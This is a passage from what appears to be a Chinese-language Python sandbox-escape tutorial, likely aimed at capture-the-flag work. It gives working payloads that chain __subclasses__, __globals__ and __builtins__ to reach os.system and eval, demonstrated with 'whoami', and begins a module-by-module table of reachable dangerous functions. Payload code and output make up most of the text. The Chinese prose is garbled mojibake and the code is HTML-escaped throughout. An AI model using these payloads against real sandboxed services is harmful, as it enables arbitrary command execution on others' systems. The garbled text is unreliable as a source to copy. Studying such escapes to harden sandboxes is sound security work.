\u0026#39;sys.float_info\u0026#39;\u0026gt;) (47, \u0026lt;type \u0026#39;EncodingMap\u0026#39;\u0026gt;) (48, \u0026lt;type \u0026#39;fieldnameiterator\u0026#39;\u0026gt;) (49, \u0026lt;type \u0026#39;formatteriterator\u0026#39;\u0026gt;) (50, \u0026lt;type \u0026#39;sys.version_info\u0026#39;\u0026gt;) (51, \u0026lt;type \u0026#39;sys.flags\u0026#39;\u0026gt;) (52, \u0026lt;type \u0026#39;exceptions.BaseException\u0026#39;\u0026gt;) (53, \u0026lt;type \u0026#39;module\u0026#39;\u0026gt;) (54, \u0026lt;type \u0026#39;imp.NullImporter\u0026#39;\u0026gt;) (55, \u0026lt;type \u0026#39;zipimport.zipimporter\u0026#39;\u0026gt;) (56, \u0026lt;type \u0026#39;posix.stat_result\u0026#39;\u0026gt;) (57, \u0026lt;type \u0026#39;posix.statvfs_result\u0026#39;\u0026gt;) (58, \u0026lt;class \u0026#39;warnings.WarningMessage\u0026#39;\u0026gt;) (59, \u0026lt;class \u0026#39;warnings.catch_warnings\u0026#39;\u0026gt;) (60, \u0026lt;class \u0026#39;_weakrefset._IterationGuard\u0026#39;\u0026gt;) (61, \u0026lt;class \u0026#39;_weakrefset.WeakSet\u0026#39;\u0026gt;) (62, \u0026lt;class \u0026#39;_abcoll.Hashable\u0026#39;\u0026gt;) (63, \u0026lt;type \u0026#39;classmethod\u0026#39;\u0026gt;) (64, \u0026lt;class \u0026#39;_abcoll.Iterable\u0026#39;\u0026gt;) (65, \u0026lt;class \u0026#39;_abcoll.Sized\u0026#39;\u0026gt;) (66, \u0026lt;class \u0026#39;_abcoll.Container\u0026#39;\u0026gt;) (67, \u0026lt;class \u0026#39;_abcoll.Callable\u0026#39;\u0026gt;) (68, \u0026lt;type \u0026#39;dict_keys\u0026#39;\u0026gt;) (69, \u0026lt;type \u0026#39;dict_items\u0026#39;\u0026gt;) (70, \u0026lt;type \u0026#39;dict_values\u0026#39;\u0026gt;) (71, \u0026lt;class \u0026#39;site._Printer\u0026#39;\u0026gt;) (72, \u0026lt;class \u0026#39;site._Helper\u0026#39;\u0026gt;) (73, \u0026lt;type \u0026#39;_sre.SRE_Pattern\u0026#39;\u0026gt;) (74, \u0026lt;type \u0026#39;_sre.SRE_Match\u0026#39;\u0026gt;) (75, \u0026lt;type \u0026#39;_sre.SRE_Scanner\u0026#39;\u0026gt;) (76, \u0026lt;class \u0026#39;site.Quitter\u0026#39;\u0026gt;) (77, \u0026lt;class \u0026#39;codecs.IncrementalEncoder\u0026#39;\u0026gt;) (78, \u0026lt;class \u0026#39;codecs.IncrementalDecoder\u0026#39;\u0026gt;) å¯ä»¥çœ‹åˆ°ï¼Œsite å°±åœ¨é‡Œé¢ï¼Œä»¥ 2.x çš„ site._Printer ä¸ºä¾‹ï¼š\n1 2 \u0026gt;\u0026gt;\u0026gt; \u0026#39;\u0026#39;.__class__.__mro__[-1].__subclasses__()[71]._Printer__setup.__globals__[\u0026#39;os\u0026#39;] \u0026lt;module \u0026#39;os\u0026#39; from \u0026#39;/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc\u0026#39;\u0026gt; os åˆå›æ¥äº†ã€‚å¹¶ä¸” site ä¸­è¿˜æœ‰ builtinsã€‚\nè¿™ä¸ªæ–¹æ³•ä¸ä»…é™äº A-\u0026gt;osï¼Œè¿˜é˜”ä»¥æ˜¯ A-\u0026gt;B-\u0026gt;osï¼Œæ¯”å¦‚ 2.x ä¸­çš„ warningsï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026gt;\u0026gt;\u0026gt; import warnings \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; warnings.os Traceback (most recent call last): File \u0026#34;\u0026lt;stdin\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; AttributeError: \u0026#39;module\u0026#39; object has no attribute \u0026#39;os\u0026#39; \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; warnings.linecache \u0026lt;module \u0026#39;linecache\u0026#39; from \u0026#39;/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/linecache.pyc\u0026#39;\u0026gt; \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; warnings.linecache.os \u0026lt;module \u0026#39;os\u0026#39; from \u0026#39;/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc\u0026#39;\u0026gt; åœ¨ç»§æ‰¿é“¾ä¸­å°±å¯ä»¥è¿™æ ·ï¼š\n1 2 3 \u0026gt;\u0026gt;\u0026gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[\u0026#39;linecache\u0026#39;].__dict__[\u0026#39;os\u0026#39;].system(\u0026#39;whoami\u0026#39;) macr0phag3 0 é¡ºä¾¿è¯´ä¸€ä¸‹ï¼Œwarningsè¿™ä¸ªåº“ä¸­æœ‰ä¸ªå‡½æ•°ï¼šwarnings.catch_warningsï¼Œå®ƒæœ‰ä¸ª_moduleå±æ€§ï¼š\n1 2 3 4 def __init__(self, record=False, module=None): ... self._module = sys.modules[\u0026#39;warnings\u0026#39;] if module is None else module ... æ‰€ä»¥é€šè¿‡_moduleä¹Ÿå¯ä»¥æ„é€  payloadï¼š\n1 2 3 \u0026gt;\u0026gt;\u0026gt; [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == \u0026#39;catch_warnings\u0026#39;][0]()._module.linecache.os.system(\u0026#39;whoami\u0026#39;) macr0phag3 0 3.x ä¸­çš„warningsè™½ç„¶æ²¡æœ‰ linecacheï¼Œä¹Ÿæœ‰__builtins__ã€‚\nåŒæ ·ï¼Œpy3.x ä¸­æœ‰\u0026lt;class 'os._wrap_close'\u0026gt;ï¼Œåˆ©ç”¨æ–¹å¼å¯ä»¥ä¸ºï¼š\n1 2 3 \u0026gt;\u0026gt;\u0026gt; \u0026#39;\u0026#39;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[\u0026#39;system\u0026#39;](\u0026#39;whoami\u0026#39;) macr0phag3 0 é¡ºä¾¿æä¸€ä¸‹ï¼Œobject æœ¬æ¥å°±æ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼Œå¦‚æœæ²¡è¿‡æ»¤è¿™ä¸ªå˜é‡çš„è¯ï¼Œpayload å¯ä»¥ç®€åŒ–ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 object.__subclasses__()[117].__init__.__globals__[\u0026#39;system\u0026#39;](\u0026#39;whoami\u0026#39;) è¿˜æœ‰ä¸€ç§æ˜¯åˆ©ç”¨builtin_function_or_method çš„ __call__ï¼š \u0026#34;\u0026#34;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval, \u0026#39;1+1\u0026#39;) æˆ–è€…ç®€å•ä¸€ç‚¹ï¼š [].__getattribute__(\u0026#39;append\u0026#39;).__class__.__call__(eval, \u0026#39;1+1\u0026#39;) è¿˜å¯ä»¥è¿™æ ·åˆ©ç”¨ï¼š\n1 2 3 4 5 6 class test(dict): def __init__(self): print(super(test, self).keys.__class__.__call__(eval, \u0026#39;1+1\u0026#39;)) # å¦‚æœæ˜¯ 3.x çš„è¯å¯ä»¥ç®€å†™ä¸ºï¼š # super().keys.__class__.__call__(eval, \u0026#39;1+1\u0026#39;)) test() ä¸Šé¢çš„è¿™äº›åˆ©ç”¨æ–¹å¼æ€»ç»“èµ·æ¥å°±æ˜¯é€šè¿‡__class__ã€__mro__ã€__subclasses__ã€__bases__ç­‰ç­‰å±æ€§/æ–¹æ³•å»è·å– objectï¼Œå†æ ¹æ®__globals__æ‰¾å¼•å…¥çš„__builtins__æˆ–è€… eval ç­‰ç­‰èƒ½å¤Ÿç›´æ¥è¢«åˆ©ç”¨çš„åº“ï¼Œæˆ–è€…æ‰¾åˆ°builtin_function_or_methodç±»/ç±»å‹__call__åç›´æ¥è¿è¡Œ eval ã€‚\n3.éå†è·å–é€ƒé€¸æ–¹æ³•\rPython 3\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 python # coding=utf-8 find_modules = {\u0026#39;asyncio\u0026#39;: [\u0026#39;subprocess\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;collections\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;concurrent\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;ctypes\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;curses\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;dbm\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;, \u0026#39;open\u0026#39;], \u0026#39;distutils\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;email\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;encodings\u0026#39;: [\u0026#39;codecs\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;ensurepip\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;html\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;http\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;idlelib\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;importlib\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__import__\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;json\u0026#39;: [\u0026#39;codecs\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;lib2to3\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;logging\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;msilib\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;multiprocessing\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;pydoc_data\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;sqlite3\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;test\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;tkinter\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;turtledemo\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;unittest\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;urllib\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;venv\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;subprocess\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;wsgiref\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;xml\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;xmlrpc\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;__future__\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;__phello__.foo\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;_bootlocale\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;_collections_abc\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;_compat_pickle\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;_compression\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;_dummy_thread\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;_markupbase\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;_osx_support\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;_pydecimal\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;_pyio\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;codecs\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;, \u0026#39;open\u0026#39;], \u0026#39;_sitebuiltins\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;_strptime\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;_threading_local\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;_weakrefset\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;abc\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;aifc\u0026#39;: [\u0026#39;__builtins__\u0026#39;, \u0026#39;open\u0026#39;], \u0026#39;antigravity\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;argparse\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;ast\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;asynchat\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;asyncore\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;base64\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;bdb\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;binhex\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;bisect\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;bz2\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;__builtins__\u0026#39;, \u0026#39;open\u0026#39;], \u0026#39;cProfile\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;calendar\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;cgi\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;cgitb\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;chunk\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;cmd\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;code\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;codecs\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;, \u0026#39;open\u0026#39;], \u0026#39;codeop\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;colorsys\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;compileall\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;importlib\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;configparser\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;contextlib\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;copy\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;copyreg\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;crypt\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;csv\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;datetime\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;decimal\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;difflib\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;dis\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;doctest\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;dummy_threading\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;enum\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;filecmp\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;fileinput\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;fnmatch\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;formatter\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;fractions\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;ftplib\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;functools\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;genericpath\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;getopt\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;getpass\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;gettext\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;glob\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;gzip\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;, \u0026#39;open\u0026#39;], \u0026#39;hashlib\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;heapq\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;hmac\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;imaplib\u0026#39;: [\u0026#39;subprocess\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;imghdr\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;imp\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;importlib\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;inspect\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;importlib\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;io\u0026#39;: [\u0026#39;__builtins__\u0026#39;, \u0026#39;open\u0026#39;], \u0026#39;ipaddress\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;keyword\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;linecache\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;locale\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;lzma\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;__builtins__\u0026#39;, \u0026#39;open\u0026#39;], \u0026#39;macpath\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;macurl2path\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;mailbox\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;mailcap\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;mimetypes\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;modulefinder\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;importlib\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;netrc\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;nntplib\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;ntpath\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;nturl2path\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;numbers\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;opcode\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;operator\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;optparse\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;os\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;, \u0026#39;open\u0026#39;], \u0026#39;pathlib\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;pdb\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;pickle\u0026#39;: [\u0026#39;codecs\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;pickletools\u0026#39;: [\u0026#39;codecs\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;pipes\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;pkgutil\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;importlib\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;platform\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;platform\u0026#39;, \u0026#39;subprocess\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;plistlib\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;codecs\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;poplib\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;posixpath\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;pprint\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;profile\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;pstats\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;pty\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;py_compile\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;importlib\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;, \u0026#39;compile\u0026#39;], \u0026#39;pyclbr\u0026#39;: [\u0026#39;importlib\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;pydoc\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;platform\u0026#39;, \u0026#39;importlib\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;queue\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;quopri\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;random\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;re\u0026#39;: [\u0026#39;__builtins__\u0026#39;, \u0026#39;compile\u0026#39;], \u0026#39;reprlib\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;rlcompleter\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;runpy\u0026#39;: [\u0026#39;importlib\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;sched\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;secrets\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;selectors\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;shelve\u0026#39;: [\u0026#39;__builtins__\u0026#39;, \u0026#39;open\u0026#39;], \u0026#39;shlex\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;shutil\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;signal\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;site\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;smtpd\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;smtplib\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;sndhdr\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;socket\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;socketserver\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;sre_compile\u0026#39;: [\u0026#39;__builtins__\u0026#39;, \u0026#39;compile\u0026#39;], \u0026#39;sre_constants\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;sre_parse\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;ssl\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;stat\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;statistics\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;string\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;stringprep\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;struct\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;subprocess\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;sunau\u0026#39;: [\u0026#39;__builtins__\u0026#39;, \u0026#39;open\u0026#39;], \u0026#39;symbol\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;symtable\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;sysconfig\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;tabnanny\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;tarfile\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;, \u0026#39;open\u0026#39;], \u0026#39;telnetlib\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;tempfile\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;textwrap\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;this\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;threading\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;timeit\u0026#39;: [\u0026#39;timeit\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;token\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;tokenize\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;, \u0026#39;open\u0026#39;], \u0026#39;trace\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;traceback\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;tracemalloc\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;tty\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;turtle\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;types\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;typing\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;uu\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], 